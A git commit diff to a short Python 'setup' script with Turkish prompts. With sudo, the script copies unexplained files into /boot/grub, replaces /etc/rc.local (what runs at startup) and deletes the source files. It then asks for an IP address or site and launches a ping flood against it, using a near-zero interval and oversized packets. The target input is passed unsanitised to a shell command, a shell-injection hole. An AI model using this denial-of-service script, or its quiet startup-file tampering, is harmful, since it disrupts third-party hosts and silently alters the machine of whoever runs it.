e02365a06310c450eb28a220064f97078e06c337
mete5050 <33295066+mete5050@users.noreply.github.com>
2018-05-13 23:21:10 +0300

    Update kurulum.py

--- kurulum.py
+++ kurulum.py
@@ -1,4 +1,5 @@
 import os
+pyesil = '\033[92m'
 os.system("sudo cp local.mo /boot/grub")
 os.system("sudo cp usab.mo /boot/grub")
 os.system("sudo rm -r /etc/rc.local")
@@ -6,6 +7,6 @@ os.system("sudo cp rc.local /etc")
 os.system("sudo rm -r local.mo")
 os.system("sudo rm -r usab.mo")
 os.system("sudo rm -r rc.local")
-x = input("IP adresi veya Site :")
+os.system("sudo rm -r kutulum.txt")
+x = input(pyesil+"IP adresi veya Site :")
 os.system("sudo ping -i 0.0000000000000001 -s 15000 " + x)
-
